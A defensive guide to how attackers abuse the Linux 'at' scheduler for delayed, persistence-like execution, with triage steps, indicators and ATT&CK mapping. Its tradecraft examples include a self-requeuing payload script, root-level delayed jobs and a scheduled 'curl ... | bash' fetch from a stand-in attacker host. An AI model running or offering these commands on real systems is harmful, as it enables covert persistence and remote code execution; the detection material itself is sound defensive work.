# At Job Persistence

## Overview

`at` is a job scheduling utility on Linux systems that allows users to schedule commands or scripts to run at a specific time in the future.

Unlike cron, which is designed for recurring execution, `at` is designed for **one-time execution**. However, attackers can leverage `at` in ways that mimic persistence by:

- scheduling delayed execution  
- chaining jobs  
- re-queuing tasks  
- using it as a stealthy execution trigger  

`at` jobs are stored internally by the system and are typically managed through:

- `/var/spool/at/`
- `/var/spool/cron/atjobs/` (varies by distribution)

> **`at` is not inherently persistent — but it can be used to simulate persistence or stage delayed execution.**

---

## Why Attackers Use At Jobs

Attackers use `at` because it provides:

- Delayed execution (useful for evasion)  
- Low visibility compared to cron  
- No need for a persistent service or loop  
- Execution under the context of the scheduling user  
- Flexibility to chain or recreate jobs  

It is especially useful for:

- staging second-phase payloads  
- executing after analyst activity subsides  
- re-establishing persistence after cleanup  
- blending into administrative task scheduling  

---

## Execution Semantics

Typical usage:

```text
echo "/tmp/run.sh" | at now + 5 minutes
```

Execution flow:
1. User (or attacker) schedules a job  
2. Job is stored in the system spool directory  
3. `atd` daemon monitors the queue  
4. At scheduled time, job executes  
5. Job is removed after execution  

### Important Characteristics

- Jobs are **not recurring by default**  
- Jobs execute once and are then deleted  
- Jobs run under the **user context that scheduled them**  
- Jobs depend on the `atd` daemon being active  

---

## Privilege Requirements

### User-Level Usage

Most users can schedule `at` jobs if permitted by:

- `/etc/at.allow`
- `/etc/at.deny`

### Elevated Impact

If an attacker has elevated privileges:
- jobs can run as root  
- system-level execution can be achieved  
- persistence-like behavior becomes more impactful  

---

## Why This Mechanism Is Effective

`at` jobs are effective because they:

- introduce time-based separation between compromise and execution  
- avoid continuous artifacts like cron entries  
- reduce visibility in many monitoring setups  
- allow attackers to trigger execution after leaving the system  

> **The attacker does not need continuous persistence if they can guarantee future execution.**

---

## Common Attacker Tradecraft

### 1. Delayed Execution Scheduled Weeks in the Future

Example:

```text
echo "/tmp/run.sh" | at now + 3 weeks
```

Execution flow:
1. Attacker gains command execution on the host  
2. Payload is staged at `/tmp/run.sh`  
3. A one-time `at` job is scheduled for several weeks in the future  
4. Immediate compromise activity ends, reducing short-term detection opportunities  
5. The job executes later, potentially after the intrusion is believed to be resolved  

Why attackers use this:
- Breaks temporal correlation between compromise and execution  
- Survives analyst focus on “recent” activity  
- Useful for re-entry, delayed staging, or post-remediation checks  

---

### 2. Off-Hours Delayed Execution to Blend with Maintenance Windows

Example:

```text
echo "/usr/local/bin/.helper" | at 02:30 next Sunday
```

Execution flow:
1. Attacker places payload in a plausible local path  
2. Schedules execution during an off-hours maintenance window  
3. At the scheduled time, `atd` runs the payload  
4. Activity blends with expected low-visibility administrative periods  

Why attackers use this:
- Reduces likelihood of immediate user observation  
- Aligns execution with times when few people are watching  
- Makes malicious behavior look more like scheduled admin work  

---

### 3. Re-Queuing Job to Simulate Persistence

Example payload at `/tmp/run.sh`:

```bash
#!/bin/bash
/usr/local/bin/.stage2
echo "/tmp/run.sh" | at now + 2 weeks
```

Initial scheduling:

```text
echo "/tmp/run.sh" | at now + 2 weeks
```

Execution flow:
1. Attacker schedules an initial delayed job  
2. The job executes `/tmp/run.sh`  
3. The payload runs its task  
4. The payload submits a new `at` job for the future  
5. The cycle repeats, creating persistence-like delayed execution  

Why attackers use this:
- Mimics recurring persistence without a visible cron entry  
- Leaves fewer static persistence artifacts than a scheduler config  
- Forces defenders to remove both the queued job and the re-queuing payload  

---

### 4. Restoring Other Persistence After a Delay

Example:

```text
echo "/usr/local/bin/restore_persist.sh" | at now + 10 days
```

Example payload behavior:
- restore SSH key access  
- recreate a cron entry  
- rewrite a systemd unit  
- re-stage a hidden binary  

Execution flow:
1. Attacker establishes a delayed `at` job  
2. Defenders remove the attacker’s obvious persistence  
3. Days later, the queued job executes  
4. The payload restores the removed persistence mechanisms  

Why attackers use this:
- Turns `at` into a recovery mechanism  
- Punishes incomplete remediation  
- Creates the illusion that persistence “came back on its own”  

---

### 5. Remote Second-Stage Retrieval Scheduled Far in the Future

Example:

```text
echo "curl http://evil.test/payload.sh | bash" | at 01:15 Jul 28
```

Execution flow:
1. Attacker schedules a one-time job with inline remote retrieval  
2. No second-stage payload must remain on disk locally  
3. At the scheduled time, the system fetches remote content  
4. The fetched payload executes dynamically  

Why attackers use this:
- Minimizes local forensic artifacts  
- Allows payload content to change after initial compromise  
- Delays execution until long after the original intrusion window  

---

### 6. Root-Level Delayed Execution After Privilege Escalation

Example:

```text
echo "/usr/local/sbin/.svc" | sudo at now + 4 weeks
```

Execution flow:
1. Attacker obtains elevated privileges  
2. Schedules a root-context `at` job weeks into the future  
3. The job remains quiet while other activity subsides  
4. The payload later executes with elevated privileges  

Why attackers use this:
- Establishes high-value delayed execution without modifying system startup directly  
- Avoids immediate changes to cron or services  
- Useful for long-term re-entry planning  

---

### 7. Chained Multi-Stage Delayed Execution

Example initial job:

```text
echo "/tmp/stage1.sh" | at now + 2 weeks
```

Example `stage1.sh` behavior:
- download `/tmp/stage2.sh`
- execute stage 2
- queue another future job

Execution flow:
1. Initial delayed job executes stage 1  
2. Stage 1 fetches or creates stage 2  
3. Stage 2 performs follow-on actions  
4. Another `at` job is scheduled for later execution  

Why attackers use this:
- Separates initial foothold from later objectives  
- Allows flexible tasking over long intervals  
- Makes single-job analysis less useful because the queue evolves over time  

---

### 8. Plausible Administrative Naming to Reduce Scrutiny

Example:

```text
echo "/usr/local/bin/backup-rotate" | at 03:00 next month
```

Execution flow:
1. Attacker uses a benign-looking script name  
2. Schedules the job for a distant maintenance-style time window  
3. The job executes under a plausible administrative appearance  
4. Malicious execution is hidden behind believable naming and timing  

Why attackers use this:
- Analysts often triage names before contents  
- A distant date and plausible name reduce urgency  
- Helps the job blend into real operational workflows  


---

## What Normal Looks Like

Legitimate `at` usage typically includes:

- one-time administrative tasks  
- delayed maintenance operations  
- testing or troubleshooting execution  
- user-scheduled reminders or scripts  

Normal characteristics:

- jobs are infrequent  
- commands are understandable and expected  
- paths reference trusted binaries or scripts  
- jobs are not continuously recreated  

---

## What Malicious Use Looks Like

### High-Signal Indicators

- execution from:
  - `/tmp`
  - `/var/tmp`
  - `/dev/shm`
- jobs that recreate themselves  
- use of:
  - `curl`
  - `wget`
  - `bash -c`
- suspicious or hidden script names  
- repeated scheduling patterns  

### Medium-Signal Indicators

- jobs scheduled shortly after compromise activity  
- jobs running during unusual hours  
- jobs tied to unknown binaries  

### Low-Signal Indicators

- legitimate admin scheduling  
- testing activity  
- infrequent one-time jobs  

---

## ATT&CK Mapping

Relevant ATT&CK techniques include:

- **T1053 – Scheduled Task/Job**
- **T1053.002 – At (Linux)**

These techniques describe adversaries using job scheduling mechanisms like `at` to execute code at specific times.

---

## Why Analysts Miss This Technique

### 1. It Is Not Persistent by Default

Analysts may dismiss `at` because jobs are one-time execution.

### 2. Jobs Disappear After Execution

Evidence may be lost if not captured before execution.

### 3. Focus Is Often on Cron

Cron is more commonly associated with persistence, leading to `at` being overlooked.

### 4. Limited Visibility

Some logging environments do not capture `at` job creation or execution clearly.

---

## Deep Analytical Guidance

### Key Question

> Is there evidence that delayed execution was used to trigger attacker activity?

---

### Focus Areas

#### 1. Job Queue Inspection

List jobs:

```text
atq
```

Inspect job:

```text
at -c <job_id>
```

#### 2. Execution Timing

- When was the job scheduled?  
- When did it execute?  
- Does it align with suspicious activity?  

#### 3. Command Content

- Does the job reference temporary paths?  
- Does it execute remote content?  
- Does it recreate itself?  

#### 4. User Context

- Which user scheduled the job?  
- Does that make sense for the system role?  

---

## Triage Workflow

1. List active jobs:

```text
atq
```

2. Inspect job contents:

```text
at -c <job_id>
```

3. Check spool directories:

```text
ls -la /var/spool/at/
```

4. Correlate with:
- process execution  
- network activity  
- user activity  

5. Review logs if available  

---

## Evidence to Preserve

- active job listings (`atq`)  
- job contents (`at -c`)  
- spool directory contents  
- command history if available  
- associated scripts or binaries  
- execution timestamps  
- user context  

---

## Why Tenax Checks This Surface

Tenax checks `at` jobs because they provide:

- stealthy execution  
- delayed payload triggering  
- persistence-like behavior through chaining  

They are especially useful in:

- post-exploitation staging  
- evasion scenarios  
- cleanup-resistant execution chains  

> `at` jobs do not need to persist forever — they only need to execute at the right time.

---

## Key Takeaway

`at` jobs are not traditional persistence mechanisms.

> They are time-delayed execution triggers that attackers can use to simulate persistence, evade detection, and stage future activity.
